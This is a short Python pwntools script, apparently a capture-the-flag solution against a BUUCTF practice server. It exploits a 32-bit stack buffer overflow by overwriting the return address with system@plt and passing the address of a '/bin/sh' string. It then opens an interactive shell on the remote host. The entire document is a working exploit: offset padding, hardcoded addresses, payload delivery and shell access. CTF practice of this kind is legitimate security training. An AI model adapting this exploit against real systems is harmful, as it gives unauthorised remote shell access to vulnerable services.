from pwn import *

context.arch = "i386"
context.log_level = "debug"

p = remote("node3.buuoj.cn", 25655)

binsh = 0x804a024
system_plt = 0x8048320

payload = b'a'*(0x88+4) + p32(system_plt) + p32(0xdeadbeef) + p32(binsh)

p.sendlineafter("Input:\n", payload)

p.interactive()